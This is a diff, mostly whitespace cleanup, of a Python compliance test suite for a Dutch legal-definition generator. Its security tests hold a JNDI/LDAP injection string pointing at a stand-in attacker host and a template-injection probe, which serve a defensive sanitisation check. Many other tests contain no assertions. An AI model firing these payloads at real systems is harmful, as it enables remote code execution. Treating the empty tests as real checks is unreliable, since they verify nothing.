@@ -46,15 +46,15 @@ class TestAuditTrailCompliance:
             juridische_context=["Strafrecht"],
             wettelijke_basis=["Wetboek van Strafrecht"]
         )
-        
+
         # Process request
         container = ServiceContainer()
         prompt_service = container.prompt_service()
         prompt = prompt_service.build_prompt(request)
-        
+
         # Verify audit log created
         audit_logger.assert_called()
-        
+
         # Check log contains required fields
         expected_fields = [
             'timestamp',
@@ -76,33 +76,33 @@ class TestAuditTrailCompliance:
                 'wettelijke_basis': ['Test wet']
             }
         }
-        
+
         # Generate hash for integrity
         entry_hash = hashlib.sha256(json.dumps(audit_entry).encode()).hexdigest()
         audit_entry['hash'] = entry_hash
-        
+
         # Verify hash matches content
         recalculated = hashlib.sha256(
             json.dumps({k: v for k, v in audit_entry.items() if k != 'hash'}).encode()
         ).hexdigest()
-        
+
         assert entry_hash == recalculated, "Audit log integrity check failed"
 
     def test_audit_retention_policy(self):
         """Audit logs must comply with retention requirements."""
         # ASTRA requires 7 year retention for legal domain
         retention_days = 7 * 365
-        
+
         # This test documents the requirement
         assert retention_days == 2555, "Legal domain requires 7 year retention"
 
     def test_audit_log_completeness(self):
         """Audit log must capture complete context flow."""
         events = []
-        
+
         with patch('src.services.audit.audit_logger.log_event') as mock_log:
             mock_log.side_effect = lambda e: events.append(e)
-            
+
             # Simulate complete flow
             request = GenerationRequest(
                 begrip="test",
@@ -110,7 +110,7 @@ class TestAuditTrailCompliance:
                 juridische_context=["Strafrecht"],
                 wettelijke_basis=["Test wet"]
             )
-            
+
             # Expected audit events
             expected_events = [
                 'context_request_received',
@@ -119,7 +119,7 @@ class TestAuditTrailCompliance:
                 'prompt_generation_started',
                 'prompt_generation_completed'
             ]
-            
+
             # This test documents the requirement
 
 
@@ -136,34 +136,34 @@ class TestPrivacyCompliance:
             r'\b06[-\s]?\d{8}\b',  # Phone numbers
             r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',  # Email
         ]
-        
+
         context = {
             'organisatorische_context': ['DJI', 'OM'],
             'juridische_context': ['Strafrecht'],
             'wettelijke_basis': ['Wetboek van Strafrecht']
         }
-        
+
         # Verify no PII patterns
         context_str = json.dumps(context)
         import re
-        
+
         for pattern in forbidden_patterns:
             assert not re.search(pattern, context_str), f"PII pattern {pattern} found in context"
 
     def test_data_minimization(self):
         """Only necessary context data should be collected."""
         manager = ContextManager()
-        
+
         # Set context with minimal data
         minimal_context = {
             'organisatorische_context': ['DJI'],
             'juridische_context': [],
             'wettelijke_basis': []
         }
-        
+
         manager.set_context(minimal_context)
         retrieved = manager.get_context()
-        
+
         # Should not add unnecessary fields
         assert len(retrieved.keys()) <= len(minimal_context.keys())
 
@@ -175,7 +175,7 @@ class TestPrivacyCompliance:
             'validation',
             'quality_improvement'
         ]
-        
+
         # Context should not be used for other purposes
         forbidden_purposes = [
             'marketing',
@@ -192,7 +192,7 @@ class TestPrivacyCompliance:
                 'juridische_context': ['Strafrecht'],
                 'wettelijke_basis': ['Test wet']
             }
-            
+
             # When storing context
             # mock_encrypt should be called
 
@@ -209,7 +209,7 @@ class TestInteroperabilityStandards:
             juridische_context=["Strafrecht"],
             wettelijke_basis=["Test wet"]
         )
-        
+
         # Should be JSON serializable
         try:
             json.dumps(request.__dict__)
@@ -226,14 +226,14 @@ class TestInteroperabilityStandards:
             'KMAR': 'Koninklijke Marechaussee',
             'CJIB': 'Centraal Justitieel Incassobureau'
         }
-        
+
         # Standard legal domains
         valid_domains = {
             'Strafrecht': 'Criminal Law',
             'Bestuursrecht': 'Administrative Law',
             'Civiel recht': 'Civil Law'
         }
-        
+
         # This test documents the vocabulary requirement
 
     def test_api_versioning(self):
@@ -243,7 +243,7 @@ class TestInteroperabilityStandards:
             organisatorische_context=["DJI"],
             api_version="1.0"  # Version support
         )
-        
+
         # Should handle versioned requests
         assert hasattr(request, 'api_version') or 'version' in request.__dict__
 
@@ -255,7 +255,7 @@ class TestSecurityRequirements:
     def test_input_validation(self):
         """All context inputs must be validated."""
         manager = ContextManager()
-        
+
         # Test invalid inputs are rejected
         invalid_contexts = [
             {'organisatorische_context': 'not_a_list'},  # Wrong type
@@ -263,7 +263,7 @@ class TestSecurityRequirements:
             {'wettelijke_basis': None},  # Null when expecting list
             {'unknown_field': ['value']},  # Unknown field
         ]
-        
+
         for invalid in invalid_contexts:
             # Should validate and reject/sanitize
             pass  # Implementation dependent
@@ -276,16 +276,16 @@ class TestSecurityRequirements:
             "${jndi:ldap://evil.com}",
             "{{7*7}}"
         ]
-        
+
         manager = ContextManager()
-        
+
         for dangerous in dangerous_inputs:
             context = {
                 'organisatorische_context': [dangerous],
                 'juridische_context': [dangerous],
                 'wettelijke_basis': [dangerous]
             }
-            
+
             # Should sanitize without executing
             manager.set_context(context)
             # No execution should occur
@@ -298,7 +298,7 @@ class TestSecurityRequirements:
             'context.write',
             'context.delete'
         ]
-        
+
         # Access should be role-based
 
 
@@ -314,11 +314,11 @@ class TestTransparencyRequirements:
             juridische_context=["Strafrecht"],
             wettelijke_basis=["Test wet"]
         )
-        
+
         # Result should include explanation
         container = ServiceContainer()
         result = container.orchestrator().generate_definition(request)
-        
+
         # Should have debug info explaining context usage
         assert hasattr(result, 'debug_info') or hasattr(result, 'metadata')
 
@@ -330,21 +330,21 @@ class TestTransparencyRequirements:
             'juridische_context_impact': 'Selected legal framework',
             'wettelijke_basis_impact': 'Provided legal references'
         }
-        
+
         # This documents the requirement
 
     def test_context_lineage_tracking(self):
         """Track how context flows through the system."""
         lineage = []
-        
+
         with patch('src.services.monitoring.track_lineage') as mock_track:
             mock_track.side_effect = lambda x: lineage.append(x)
-            
+
             request = GenerationRequest(
                 begrip="test",
                 organisatorische_context=["DJI"]
             )
-            
+
             # Process through system
             # Lineage should be tracked
 
@@ -363,7 +363,7 @@ class TestAccessibilityCompliance:
             'clear_labels',
             'error_identification'
         ]
-        
+
         # This documents UI requirements
 
     def test_multilingual_support(self):
@@ -372,7 +372,7 @@ class TestAccessibilityCompliance:
             {'language': 'nl', 'organisatorische_context': ['DJI']},
             {'language': 'en', 'organisatorische_context': ['DJI']}
         ]
-        
+
         # Should handle both languages
 
 
@@ -388,7 +388,7 @@ class TestDataGovernance:
             'wettelijke_basis': 'user_provided',
             'generated_prompt': 'system_generated'
         }
-        
+
         # Ownership should be tracked
 
     def test_data_quality_validation(self):
@@ -399,14 +399,14 @@ class TestDataGovernance:
             'consistency',
             'timeliness'
         ]
-        
+
         manager = ContextManager()
         context = {
             'organisatorische_context': ['DJI'],
             'juridische_context': ['Strafrecht'],
             'wettelijke_basis': ['Wetboek van Strafrecht']
         }
-        
+
         # Should validate quality
         # This documents the requirement
 
@@ -419,7 +419,7 @@ class TestDataGovernance:
             'source',
             'classification'
         ]
-        
+
         # This documents metadata requirements
 
 
@@ -442,7 +442,7 @@ class TestComplianceReporting:
             },
             'timestamp': datetime.datetime.now().isoformat()
         }
-        
+
         # Should generate comprehensive report
 
     def test_compliance_monitoring(self):
@@ -460,7 +460,7 @@ class TestComplianceReporting:
                 'severity': 'high',
                 'context': {'action': 'context_update'}
             }
-            
+
             # Should trigger alert
             # mock_alert.assert_called()
 
@@ -477,26 +477,26 @@ class TestJusticeDomainSpecific:
             'Civiel recht',
             'Penitentiair recht'
         ]
-        
+
         invalid_terms = [
             'Criminal stuff',
             'Admin law',
             'Civil'
         ]
-        
+
         # Should validate against official terms
 
     def test_chain_of_custody(self):
         """Maintain chain of custody for legal contexts."""
         custody_chain = []
-        
+
         # Each context modification should be tracked
         events = [
             {'actor': 'user', 'action': 'create', 'context': {}},
             {'actor': 'system', 'action': 'validate', 'context': {}},
             {'actor': 'system', 'action': 'enrich', 'context': {}}
         ]
-        
+
         # Chain must be unbroken
 
     def test_legal_retention_requirements(self):
@@ -507,7 +507,7 @@ class TestJusticeDomainSpecific:
             'Civiel recht': 10,
             'Jeugdrecht': 30
         }
-        
+
         # Should apply correct retention
 
 
